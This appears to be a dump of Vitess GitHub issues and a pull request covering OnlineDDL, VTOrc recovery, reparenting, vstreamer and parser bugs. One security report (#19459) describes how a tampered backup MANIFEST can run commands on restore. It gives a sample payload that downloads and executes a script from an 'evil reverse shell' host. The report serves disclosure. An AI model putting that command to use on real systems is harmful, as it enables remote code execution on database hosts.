You can read more about how Vitess handles migrations when a user specifies a preference for instant DDL here: https://vitess.io/docs/user-guides/schema-changes/instant-ddl-migrations/#instant-ddl-in-managed-schema-changes

Similar incorrect decisions result from other implicit column level declarations such as `DEFAULT NULL` and even casing as we will see below. 

### Reproduction Steps

```
git checkout main && make build

cd examples/local

./101_initial_cluster.sh

mysql -e "CREATE TABLE items (id INT NOT NULL PRIMARY KEY, name VARCHAR(30) NOT NULL, color ENUM('blue', 'red', 'yellow', 'black', 'white')) COLLATE utf8mb4_unicode_ci; set @@ddl_strategy='vitess --prefer-instant-ddl'; ALTER TABLE items MODIFY color ENUM('blue', 'red', 'yellow', 'black', 'white', 'pink')";

sleep 5

mysql -e "show vitess_migrations\G" | grep special_plan
```

You will see that the `special_plan` field is empty, because there was nothing special about the migration (when it is done using INSTANT then it is noted there):
```
❯ mysql -e "show vitess_migrations\G" | grep special_plan
                     special_plan:
```

If we run the same test but elide the `COLLATE` clause:
```
git checkout main && make build

cd examples/local

./101_initial_cluster.sh

mysql -e "CREATE TABLE items (id INT NOT NULL PRIMARY KEY, name VARCHAR(30) NOT NULL, color ENUM('blue', 'red', 'yellow', 'black', 'white')); set @@ddl_strategy='vitess --prefer-instant-ddl'; ALTER TABLE items MODIFY color ENUM('blue', 'red', 'yellow', 'black', 'white', 'pink')";

sleep 5

mysql -e "show vitess_migrations\G" | grep special
```

With the result being the same, and the logs from the WiP PR to fix this show us why:
```
/opt/vtdataroot/tmp/vttablet.pslord.matt.log.INFO.20260219-025024.70590:I0219 02:50:28.476277   70590 capability.go:289] ALTER "MODIFY COLUMN `color` ENUM('blue', 'red', 'yellow', 'black', 'white', 'pink')" is not eligible for INSTANT DDL because the type of the column is being changed in a way that is not supported with INSTANT DDL. Old column: "`color` enum('blue', 'red', 'yellow', 'black', 'white') DEFAULT NULL", new column: "`color` ENUM('blue', 'red', 'yellow', 'black', 'white', 'pink')"
```

Finally, if we add the implicit `DEFAULT NULL` clause in our `ALTER`:
```
git checkout main && make build

cd examples/local

./101_initial_cluster.sh

mysql -e "CREATE TABLE items (id INT NOT NULL PRIMARY KEY, name VARCHAR(30) NOT NULL, color ENUM('blue', 'red', 'yellow', 'black', 'white')); set @@ddl_strategy='vitess --prefer-instant-ddl'; ALTER TABLE items MODIFY color ENUM('blue', 'red', 'yellow', 'black', 'white', 'pink') DEFAULT NULL";

sleep 5

mysql -e "show vitess_migrations\G" | grep special_plan
```

And yet we STILL failed 😄 
```
/opt/vtdataroot/tmp/vttablet.pslord.matt.log.INFO.20260219-025809.77580:I0219 02:58:14.047989   77580 capability.go:288] ALTER "MODIFY COLUMN `color` ENUM('blue', 'red', 'yellow', 'black', 'white', 'pink') DEFAULT NULL" is not eligible for INSTANT DDL because the type of the column is being changed in a way that is not supported with INSTANT DDL. Old column: "`color` enum('blue', 'red', 'yellow', 'black', 'white') DEFAULT NULL", new column: "`color` ENUM('blue', 'red', 'yellow', 'black', 'white', 'pink') DEFAULT NULL"
```

In this case it was a simple CASE issue with the `enum` keyword:
```
git checkout main && make build

cd examples/local

./101_initial_cluster.sh

mysql -e "CREATE TABLE items (id INT NOT NULL PRIMARY KEY, name VARCHAR(30) NOT NULL, color ENUM('blue', 'red', 'yellow', 'black', 'white')); set @@ddl_strategy='vitess --prefer-instant-ddl'; ALTER TABLE items MODIFY color enum('blue', 'red', 'yellow', 'black', 'white', 'pink') DEFAULT NULL";

sleep 5

mysql -e "show vitess_migrations\G" | grep special
```

And FINALLY! 
```
❯ mysql -e "show vitess_migrations\G" | grep special
                     special_plan: {"operation":"instant-ddl"}
```

So we can see that the decision is very brittle, in particular for ENUM/SET columns, and is affected by implicit column defaults and casing.

### Binary Version

```sh
❯ vtgate --version
vtgate version Version: 24.0.0-SNAPSHOT (Git revision 3ddb1830c74940494fd4efbd2fadea56bef65fee branch 'alter_enum_instant') built on Thu Feb 19 02:53:05 UTC 2026 by matt@pslord.local using go1.26.0 darwin/arm64
```

### Operating System and Environment details

```sh
N/A
```

### Log Fragments

```sh

```
vitessio/vitess#19424.title: Bug Report: OnlineDDL incorrectly marks ENUM/SET modifications as ineligible for INSTANT DDL

vitessio/vitess#19428.body:
### Overview of the Issue

After an attempted recovery by VTOrc, it will [resolve the recovery](https://github.com/mhamza15/vitess/blob/928627a56a04dad5afa5607b7c85ad9eefe5982d/go/vt/vtorc/logic/topology_recovery.go#L285-L289), which [sets the `end_recovery` column to now](https://github.com/mhamza15/vitess/blob/928627a56a04dad5afa5607b7c85ad9eefe5982d/go/vt/vtorc/logic/topology_recovery_dao.go#L143) for the recovery. This is used to [prevent multiple recoveries from attempting to act at the same time](https://github.com/mhamza15/vitess/blob/928627a56a04dad5afa5607b7c85ad9eefe5982d/go/vt/vtorc/logic/topology_recovery_dao.go#L119-L123). If the `resolveRecovery` defer isn't reached for whatever reason, all future recoveries are permanently blocked from acting, as `end_recovery` will permanently remain `null`.

In this instance, this was _likely_ due to the fact that there is [no timeout on the context](https://github.com/mhamza15/vitess/blob/f20e9d6d6de07633793ed80da5e3222acfaab42b/go/vt/vtorc/logic/topology_recovery.go#L794-L796) that is passed to the [`DemotePrimary` call](https://github.com/vitessio/vitess/blob/ae0234a89b83449ac5adaa09ab70dc5d9a222622/go/vt/vtorc/logic/topology_recovery.go#L1275) in the `demoteStaleTopoPrimary` recovery. This likely hung indefinitely, as no logs were seen after reaching that point.

### Reproduction Steps

TBC

### Binary Version

```sh
main and all release branches
```

### Operating System and Environment details

```sh
all
```

### Log Fragments

```sh
I0218 20:18:26.874989  1 log.go:138] Recovery for StaleTopoPrimary on keyspace-a/-: Analysis: StaleTopoPrimary, will demote stale topo primary cell_c-0000000100
...
I0218 20:18:27.791029  1 locks.go:165] Locking shard keyspace-a/- for action VTOrc Recovery for StaleTopoPrimary on cell_c-0000000100 with options: {lockType:1 ttl:0}
E0218 20:18:27.795195  1 log.go:168] Recovery for StaleTopoPrimary on keyspace-a/-: Failed to lock shard, aborting recovery: node already exists: lock already exists at path keyspaces/keyspace-a/shards/-
```

For the  `MoveTables` command, the `--on-ddl` param takes only uppercase option names like `EXEC`. The command doesn't throw errors on lowercase names, nor does it actually apply the option. Option names like `exec` will fail silently.

vitessio/vitess#19459.body:
### Overview of the Issue

When an external compressor is used for a backup made by Vitess, the command (and args) used are stored in the `MANIFEST` file that is stored beside the backup data files

When a backup is restored, if a external compressor config exists in the `MANIFEST` and _(crucially)_ no `--external-decompressor` configuration/flag was provided to the running VTTablet, the commands/args from the `MANIFEST` are used to decompress the backup

Some simple validation happens on this command and arguments, but this is not enough. The current approach means an attacker with in the following situation could escalate access to the host running the tablet:
1. Attacker has acccess to modify the `MANIFEST` file in the backup storage _(for example an S3 bucket)_ 
2. Attacker has the ability (directly or indirectly) for their tampered backup(s) to be restored
    - Indirect-access example: backups are automatically restored by automation

To resolve this immediate risk, we should not trust commands in the `MANIFEST` file by default in the short-term, and in the longer-term we shouldn't store commands in files that could be later edited by attackers

The longer-term fix to this problem will come as a separate feature request

The Vitess Maintainers would like to thank NeuroWinter (dev@neurowinter.com) for raising this security issue! ❤️ 


### Reproduction Steps

1. Create a cluster
2. Create a backup
3. Modify the `MANIFEST` file to contain a mallicious command and arguements, a pseudo-example:
    - Command/decompressor: `bash`
    - Arguments: `-c "curl -o /tmp/vuln.sh http://my-evil-reverse-shell.io/vuln.sh && chmod +x /tmp/vuln.sh && ./tmp/vuln.sh"`
4. Trigger a restore of this backup with no `--external-decompressor` flags passed to VTTablet
5. Notice the arbitrary command is executed by the restore

### Binary Version

```sh
>= v23 and `main` branch
```

### Operating System and Environment details

```sh
N/A
```

### Log Fragments

```sh

```
vitessio/vitess#19459.title: Bug Report: backup restore trusts decompressor in `MANIFEST` by default

vitessio/vitess#19519.body:
### Overview of the Issue

Several VTOrc recovery code paths pass a `context.Background()` with no timeout to external `tmc` and `topo` RPCs. If a tablet or topo server becomes unresponsive, these calls block indefinitely, preventing any other recoveries from executing. Similar to https://github.com/vitessio/vitess/issues/19428. Affected calls:

- `restartDirectReplicas`: `tmc.StopReplication`, `tmc.StartReplication`, and `ts.GetTabletsByShard`
- `refreshTabletInfoOfShard`: passes the bare context to `ts.GetTabletsByShardCell`

### Reproduction Steps

TBC

All

### Operating System and Environment details

Any

vitessio/vitess#19521.body:
### Overview of the Issue

The `stopReplicationAndBuildStatusMaps` function called by `EmergencyReparentShard` expects at-most a single `StopReplicationAndGetStatus` RPC to fail, because the `PRIMARY` can be down when an ERS is called

`stopReplicationAndBuildStatusMaps` checks for this by subtracting the total number of errors encountered by 1 😢 
> // In general we want to wait for n-1 tablets to respond, since we know the primary tablet is down.

Simply subtracting `1` from the list of errors opens up `EmergencyReparentShard` to unintended scenarios, such as the `PRIMARY` is up, but the most-advanced candidate returns a transient error. For good or for bad, today ERS won't proceed if we are not certain we have the best candidate. To put it more simply, contrary to the code comment above, we don't know this is the primary, the single failure in some use cases could be a replica we should wait _(fail the ERS)_ for

### Reproduction Steps

This problem can be seen in the code here: https://github.com/timvaillancourt/vitess/blob/main/go/vt/vtctl/reparentutil/replication.go#L339

### Binary Version

```sh
v24/`main`
```

### Operating System and Environment details

```sh
N/A
```

### Log Fragments

```sh

```
vitessio/vitess#19521.title: Bug Report: `stopReplicationAndBuildStatusMaps` in ERS has weak `PRIMARY` check

vitessio/vitess#19588.body:
## Problem

During a VReplication-based Online DDL cut-over, two pooled connections are used:

1. **`lockConn`** — holds `LOCK TABLES` to block writes during the rename window
2. **`renameConn`** — executes the atomic `RENAME TABLE`

If the cut-over fails or exits early (before the rename succeeds), **`lockConn` is returned to the pool via `.Recycle()` without being killed first**. The connection re-enters the pool still holding `LOCK TABLES`. With MySQL's default `wait_timeout` of 8 hours, this idle connection can hold the lock on the table for a very long time — causing all subsequent writes to hang silently until the lock is eventually released.

There is also a defer ordering bug with `renameConn`: `renameConnRestoreLockWaitTimeout()` is called *after* `renameConn.Recycle()`, meaning it attempts to restore a session variable on a connection that has already been returned to the pool.
vitessio/vitess#19588.title: OnlineDDL: lockConn not killed on cut-over failure, may hold LOCK TABLES open

vitessio/vitess#19593.body:
### Feature Description

Call vttablet_restore_done hook in the RPC restore code path, as well as the startup restore.

### Use Case(s)

Currently, the hook will only execute after the startup restore, but not after the restore done via the RPC code path. Since the hook can be used for restore auditing, it should execute in all cases.

Another obvious use case is easier testing of the hook logic.
vitessio/vitess#19593.title: Feature Request: invoke vttablet_restore_done hook in all code paths

vitessio/vitess#19627.body:
### Overview of the Issue

Reported as well by @chrisplim in the Vitess Slack channel.

Follow-up to #5825. PR #6551 fixed status flags on query response packets via `fillInTxStatusFlags()`, but the initial handshake packet was not addressed. `vtgateHandler.NewConnection()` never sets `c.StatusFlags`, so the handshake and auth OK packets report `status_flags=0`. 

MySQL client libraries that read the handshake to optimize connection init misinterpret this as autocommit=OFF. For example, pymysql compares its desired autocommit state against the handshake flags and skips `SET AUTOCOMMIT=0` when the states appear to match, but VTGate's session defaults to `Autocommit: true`, creating a silent mismatch.

The `Handler.NewConnection()` interface seems to have been designed for this originally. Its comment says "the handler can decide to set StatusFlags... In particular, ServerStatusAutocommit might be set." It looks like this was just never implemented.

### Reproduction Steps

1. Connect to VTGate using pymysql with `autocommit=False`
2. Capture the handshake packet. `status_flags` is `0x0000`
3. pymysql sees `server_status & 0x0002 == 0`, interprets autocommit=OFF
4. pymysql skips sending `SET AUTOCOMMIT=0` (desired state matches reported state)
5. VTGate session defaults to `Autocommit: true`, so queries run in autocommit mode despite client expecting otherwise

Connecting to MySQL directly, the handshake has `status_flags=0x0002` (`SERVER_STATUS_AUTOCOMMIT`), pymysql detects the mismatch, and correctly sends `SET AUTOCOMMIT=0`.

### Binary Version

```sh
Reproduced against `vitess/lite:mysql80-2026-02-26.2dd93fe`
```

### Operating System and Environment details

```sh
N/A
```

### Log Fragments

```sh
N/A
```
vitessio/vitess#19627.title: Bug Report: vtgate handshake packet sends status_flags=0, missing SERVER_STATUS_AUTOCOMMIT

vitessio/vitess#19629.body:
### Overview of the Issue

The OnlineDDL cutover uses 3 x MySQL connections _(preparation, lock, rename)_ that are critical for the safe cut-over of a VReplication migration. Today the cutover carefully manages `@@session.lock_wait_timeout` on these connections, but does NOT manage `@@session.wait_timeout`

This means if a MySQL server has a non-default _(lower)_ `wait_timeout` configured, MySQL can kill cutover connections mid-operation. The default `wait_timeout` is `28800` _(8 hours)_ which is usually fine, but some users configure this lower for connection hygiene

During cutover, the `lockConn` acquires `LOCK TABLES` and then waits while:
1. The rename goroutine runs
2. VReplication catches up to position
3. Force cutover kills conflicting queries _(if applicable)_

If `wait_timeout` expires during any of these waits, MySQL kills the connection. The locks are released _(MySQL auto-releases on connection death)_, and the `RENAME TABLE` could proceed against an unlocked table — that's where data corruption risk comes in

Related: https://github.com/vitessio/vitess/pull/19586

### Reproduction Steps

1. Set `wait_timeout` to a low value globally on a MySQL server, eg: `set global wait_timeout=2`
2. Run an OnlineDDL migration
3. Stall the cutover with a competing `LOCK TABLES ... WRITE`
4. Observe that cutover connections are killed by MySQL after `wait_timeout` expires

### Binary Version

```
All versions
```
vitessio/vitess#19629.title: Bug Report: OnlineDDL cutover does not manage `wait_timeout` on MySQL connections

vitessio/vitess#19655.body:
### Overview of the Issue

In https://github.com/vitessio/vitess/issues/13205, a warming reads feature was implemented with the goal to warm replica buffer pools with `PRIMARY`-tablet reads

This feature is implemented by asyncing _(`go funcHere`)_ mirrored `SELECT` queries to tablets in the background, from VTGate. Those mirrored-calls are async'd into goroutines and their results are thrown away entirely. The results are not important because the only goal of the query is to warm caches - there is no subscriber

Today, VTTablet is returning query results all the way up to those mirror functions in VTGate, but no one uses the results.

Solution: don't send query results to VTGate on warming reads, as originally proposed as follow-up (by @me) in https://github.com/vitessio/vitess/pull/13206

### Reproduction Steps

1. Enabled warming reads
2. Observe full query results (from warming reads) being sent to VTGate

### Binary Version

```sh
v23+
```

### Operating System and Environment details

```sh
Any
```

### Log Fragments

```sh

```
vitessio/vitess#19655.title: Bug Report: warming reads feature returns unnecessary query results

vitessio/vitess#19667.body:
### Overview of the Issue

We found a `vstreamer` buffering bug where terminal events like `COMMIT` / `OTHER` — which end the open transaction context — can be filtered out before they reach the flushing path in `parseEvents`.

`parseEvents` buffers events like `GTID` until it sees a terminal event (`COMMIT`, `DDL`, `OTHER`, `HEARTBEAT`, `VERSION`). If the terminal marker is filtered out too early, the buffered events are retained until some later heartbeat or terminal event flushes them.

This showed up while investigating increased memory usage on primary `vttablet`s after https://github.com/vitessio/vitess/pull/19204. That PR made the schema tracker open a filtered internal vstream requesting only `GTID` and `DDL`.

In that setup, normal row transactions produce `GTID` followed by filtered `COMMIT`, so the `GTID`s can remain buffered much longer than intended on a busy primary.

Heap profiles from an affected tablet pointed at a retained allocation in:

- `vstreamer.(*vstreamer).parseEvents.func1`

The retained stack was coming from the schema tracker stream.

### Reproduction Steps

1. Start a filtered vstream with `EventTypes = [GTID, DDL]`
2. Execute multiple row transactions
3. Observe that the buffered `GTID`s are not flushed at each transaction boundary when `COMMIT` is filtered
4. Instead, they can be emitted together later when a heartbeat or another terminal event arrives

We added a regression test that reproduces this behavior:

- `go/vt/vttablet/tabletserver/vstreamer/vstreamer_test.go`
- `TestVStreamFilteredTerminalEventsFlushBufferedState`

Before the fix, that test shows two transactions producing one later batch containing two `GTID`s, instead of two separate flushes.

### Binary Version

```sh
main
```

### Operating System and Environment details

```sh
N/A
```

### Log Fragments

```sh
Heap profile investigation pointed to retained allocations rooted in:

vstreamer.(*vstreamer).parseEvents.func1

The retained path was associated with schema.(*Tracker).process and a filtered internal vstream requesting only GTID and DDL.
```
vitessio/vitess#19667.title: Bug Report: VStreamer Can Retain Buffered GTIDs When Terminal Events are Filtered

vitessio/vitess#19673.body:
## Overview of the Issue

The `--warming-reads-query-timeout` VTGate flag is intended to set a timeout on warming replica reads, but the timeout context created in `CloneForReplicaWarming()` is never actually passed to the query execution path.

`CloneForReplicaWarming()` creates a `context.WithTimeout` at [`go/vt/vtgate/executorcontext/vcursor_impl.go:305`](https://github.com/vitessio/vitess/blob/main/go/vt/vtgate/executorcontext/vcursor_impl.go#L305), but it's only used for `logStats.Ctx`. The warming read goroutine in [`go/vt/vtgate/engine/route.go:534-549`](https://github.com/vitessio/vitess/blob/main/go/vt/vtgate/engine/route.go#L534-L549) passes the original parent request `ctx` to both `findRoute()` and `ExecuteMultiShard()`, so the warming reads timeout never actually bounds anything.

## Reproduction Steps

1. Set `--warming-reads-query-timeout` to a short duration _(e.g. `1ms`)_
2. Configure warming reads on a VTGate
3. Execute a query that triggers a warming read
4. Observe that the warming read is **not** cancelled after the configured timeout — it runs until the original request context is done or the query completes naturally

## Binary Version

All versions with warming reads support _(introduced in v21)_

## Operating System and Environment details

N/A — this is a code-level bug, not environment-specific

## Log Fragments

N/A
vitessio/vitess#19673.title: Bug Report: warming-reads-query-timeout does not bound warming read queries

vitessio/vitess#19675.body:
## Description

MySQL names implicit column aliases based on the exact input text, preserving case and whitespace verbatim. For example, `SELECT CoUnT(*) FROM t` produces a column named `CoUnT(*)`. Vitess previously fell back to re-formatting the AST via `String(ae.Expr)`, producing normalized lowercase output like `count(*)`.

This uses goyacc's built-in `%locations` feature to track byte-offset spans through grammar reductions, storing the original text as `InputExpression` on `AliasedExpr`. `ColumnName()` and the normalizer now prefer this over the formatted AST.

Verified against MySQL 8.0 over the wire — all test cases produce identical implicit column aliases.

## How it works

- goyacc `%locations` with a custom `location` struct (`start`, `end` byte offsets) propagates spans automatically through reductions via `yyLocDefault`
- In `Lex()`, each token's `yyloc` is set from `currStart` (captured after `skipBlank()` in `Scan`) and `Pos`
- In the `select_expression` grammar rule, `@1.start` / `@1.end` give the span of the expression; `GetInputExpression(start, end)` slices the tokenizer's input buffer to extract the original text
- `InputExpression` is only set when no explicit alias is provided, and is skipped for `ColName` expressions (which already have deterministic column names)
- For string literals and introducer+string expressions, `ColumnName()` returns the unquoted value directly (matching MySQL behavior) without using `InputExpression`
- Trailing comments after expressions are excluded from `InputExpression` — the lexer positions naturally stop before trailing whitespace/comments
- Versioned comment expressions (e.g. `/*!80102 UPPER(a) */`) resolve to the inner expression's alias, not the comment wrapper — this works naturally with inline versioned comment scanning since positions reference the same buffer

## Performance

The performance impact is quite low. This adds a string field to `AliasedExpr` that holds a substring of the original query text. It is only set for items of the `SELECT` list that are actual expressions (not for regular `a.col` references, `a.*` star expressions, or literals), and only when no explicit alias is provided.

## Benchmarks

```

ParseStress/sql1-14                         84.00 ±  0%         84.00 ±  0%        ~ (p=1.000 n=10)
ParseTraces/django_queries.txt-14          5.937k ±  0%        5.939k ±  0%   +0.03% (p=0.000 n=10)
ParseTraces/lobsters.sql.gz-14             258.3k ±  0%        259.4k ±  0%   +0.42% (p=0.000 n=10)
```

Execution time is statistically unchanged across all benchmarks. Memory overhead is +1.3% on real-world traces. Zero additional allocations on stress benchmarks (32/32, 84/84). Allocation increase on traces is negligible (+0.03% to +0.42%) because `InputExpression` is skipped for `ColName` and `Literal` — the most common expression types.

## Related Issue(s)

Fixes https://github.com/vitessio/vitess/issues/18182. See also https://github.com/vitessio/vitess/pull/19543.

## Checklist

- [ ] "Backport to:" labels have been added if this change should be back-ported to release branches
- [ ] If this change is to be back-ported to previous releases, a justification is included in the PR description
- [x] Tests were added or are not required
- [x] Did the new or modified tests pass consistently locally and on CI?
- [ ] Documentation was added or is not required

## Deployment Notes

None — this is a parser-internal change. `AliasedExpr` gains a new `InputExpression string` field which is automatically handled by generated clone/equals/visit/size code.

### AI Disclosure

This PR was written primarily by Claude Code — I provided direction and review.

vitessio/vitess#19680.body:
### Overview of the Issue

If a `MoveTables` `SwitchTraffic` operation is cancelled (context timeout, client abort, etc.) **after** the resharding journal has been created but **before** the forward workflow is frozen, the forward stream is left in a stopped-but-not-frozen state that is vulnerable to corruption on restart.

The `switchWrites` path in `go/vt/vtctl/workflow/server.go` creates the journal (point of no return) and then performs several subsequent steps including `freezeTargetVReplication`, all using the caller's context. If that context is cancelled during this tail, the operation returns an error even though writes have already been switched. More critically, it leaves the forward workflow with `state=Stopped, message="stopped for cutover"` — but not `message="FROZEN"`.

Since the only guard against restarting a cutover'd stream is `message == "FROZEN"` (`go/vt/vttablet/tabletmanager/rpc_vreplication.go:576`), the stopped-but-unfrozen stream can be restarted via normal workflow operations (e.g., `MoveTables start`). When the restarted stream encounters the journal that was already written, `transitionJournal` (`go/vt/vttablet/tabletmanager/vreplication/engine.go:694`) rewrites `BinlogSource.Keyspace` from the source keyspace to the target keyspace, silently corrupting the workflow metadata.

For `ExternalMysql` workflows, the journal is always visible to the forward stream because the `_vt` sidecar (including `_vt.resharding_journal`) lives on the same MySQL instance that the `mysqlConnector` VStreams from.

The corruption is invisible during normal replication — `ExternalMysql` uses the connector name, not `BinlogSource.Keyspace`, for the actual connection. But any subsequent vtctld operation that reads `BinlogSource.Keyspace` (state checks, SwitchTraffic, WorkflowDelete safety guards) sees `sourceKeyspace == targetKeyspace` and behaves incorrectly:

- `WorkflowStatus` permanently reports "Reads Not Switched. Writes Not Switched"
- A subsequent `SwitchTraffic` writes journals to the **target** tablet instead of the source, creates the reverse workflow on the **target** tablet, and the reverse workflow immediately enters an infinite journal transition loop (~1 cycle/second)
- `WorkflowDelete` safety guards are bypassed

### Reproduction Steps

1. Set up a `MoveTables` workflow (ExternalMysql or standard) from source keyspace to target keyspace
2. Run the workflow to completion (copy + catchup)
3. Initiate `SwitchTraffic` with a context timeout short enough that it expires after `createJournals` but before `freezeTargetVReplication` completes. Alternatively, cancel the request during that window.
4. Observe that the forward workflow is in `state=Stopped, message="stopped for cutover"` (not FROZEN)
5. Restart the workflow via `MoveTables start` or equivalent
6. Observe that `_vt.vreplication` now has `BinlogSource.Keyspace` set to the target keyspace (corrupted)
7. Subsequent `WorkflowStatus` calls report "Not Switched" despite the switch having completed
8. A subsequent `SwitchTraffic` attempt creates the reverse workflow on the wrong tablet and enters an infinite journal transition loop

For a deterministic reproduction, inject a delay or cancellation between `createJournals` and `freezeTargetVReplication` in `switchWrites` (`go/vt/vtctl/workflow/server.go`).

### Binary Version

Observed on builds based on Vitess main (v22-equivalent, March 2026). The affected code paths are present in all current release branches.

Relevant files:
- `go/vt/vtctl/workflow/server.go` — `switchWrites` (line ~3117), `WorkflowSwitchTraffic` (line ~2765)
- `go/vt/vtctl/workflow/traffic_switcher.go` — `createJournals` (line 693), `freezeTargetVReplication` (line 1212)
- `go/vt/vttablet/tabletmanager/vreplication/engine.go` — `transitionJournal` (line 642)
- `go/vt/vttablet/tabletmanager/rpc_vreplication.go` — FROZEN guard (line 576)

### Operating System and Environment details

Not OS-specific. Observed on Kubernetes (GKE) with single-shard unsharded keyspace, ExternalMysql source, multiple concurrent MoveTables workflows on the same target keyspace.

### Log Fragments

vtctld — SwitchTraffic returns success but reports corrupted state:
```
SwitchTraffic done for workflow target-ks.wf1, returning response
  start_state:"Reads Not Switched. Writes Not Switched"
  current_state:"Reads Not Switched. Writes Not Switched"
```

vttablet — reverse workflow infinite journal transition loop after subsequent SwitchTraffic on corrupted workflow:
```
engine.go:582] Journal encountered for (wf1_reverse:5887659592514648964 target-ks:-): ...
  participants:{keyspace:"target-ks" shard:"-"}    ← should be source-ks
controller.go:125] creating controller with id: 18, name: wf1_reverse
engine.go:582] Journal encountered for (wf1_reverse:5887659592514648964 target-ks:-): ...
controller.go:125] creating controller with id: 19, name: wf1_reverse
... (continues at ~1/second, controller IDs incrementing)
```

_vt.vreplication_log — showing the transitionJournal corruption (vrepl_id 1 deleted, vrepl_id 2 created with corrupted BinlogSource):
```
| vrepl_id |    type        |  state  |     created_at      |
|        1 | State Changed  | Running | 2026-03-05 19:55:59 |  ← original stream, last seen before restart
|        2 | State Changed  | Running | 2026-03-05 22:40:52 |  ← transitionJournal created this, corrupted BinlogSource
```
vitessio/vitess#19680.title: Bug Report: MoveTables SwitchTraffic context cancellation after journal creation corrupts workflow metadata

vitessio/vitess#19708.body:
### Overview of the Issue

If you have a number of DDLs made in quick succession the historian can note a schema cache miss when we should use the most recently cached schema. That causes the "current" schema to be used which then includes the changes from the most recently executed DDL.

### Reproduction Steps

See the regression tests added in https://github.com/vitessio/vitess/pull/19697

### Binary Version

```sh
vtgate version Version: 24.0.0-SNAPSHOT (Git revision  branch '') built on  by @ using go1.26.1 darwin/arm64
```

### Operating System and Environment details

```sh
N/A
```

### Log Fragments

```sh
N/A
```
vitessio/vitess#19708.title: Bug Report: Schema historian / tracker can use current schema when it should use last cached one

vitessio/vitess#19712.body:
### Feature Description

Run VTBackup `--init-backup-sql-queries` _after_ the catch-up replication phase, not before.

### Use Case(s)

The proposed change enables us to run queries like `OPTIMIZE TABLES` to combat table fragmentation introduced by the backup process itself.
vitessio/vitess#19712.title: Feature Request: run `--init-backup-sql-queries` after vtbackup catchup-replication

vitessio/vitess#19751.body:
### Overview of the Issue

When using vttablet with an external (unmanaged) MySQL such as Google Cloud SQL, TabletManager.MysqlHostMetrics() panics with a nil pointer dereference every 10 seconds. 
```
TabletManager.MysqlHostMetrics() on xxxxx panic: runtime error: invalid memory address or nil pointer dereference
```

This is because the tablet throttler periodically calls this RPC to collect host metrics (mysqld-loadavg and mysqld-datadir-used-ratio), but when using external mysql, mycnf is not initialized (remains nil). The hostMetrics() function in go/vt/mysqlctl/mysqld.go then attempts to access cnf.DataDir, causing a panic.  
The panic is recovered by HandleRPCPanic, so vttablet does not crash, but error logs are emitted continuously.                   

This issue was introduced by PR #16850 and PR #16904 as part of the multi-metrics throttler project. These host metrics are intended to measure the MySQL host's load average and disk usage, but when MySQL is external, the vttablet host is not the MySQL host, so these metrics are not meaningful.

### Reproduction Steps

This occurs on a vttablet that has the throttler enabled while using an external MySQL.

### Binary Version

```sh
- vtgate version Version: 23.0.3 (Git revision 0466df5c81c56c9a3d6cad0d38991cf93b657fa2 branch 'HEAD') built on Fri Feb 27 01:43:41 UTC 2026 by vitess@buildkitsandbox using go1.25.7 linux/amd64
- vttablet version Version: 23.0.3 (Git revision 0466df5c81c56c9a3d6cad0d38991cf93b657fa2 branch 'HEAD') built on Fri Feb 27 01:43:41 UTC 2026 by vitess@buildkitsandbox using go1.25.7 linux/amd64
```

### Operating System and Environment details

```sh
NA
```

### Log Fragments
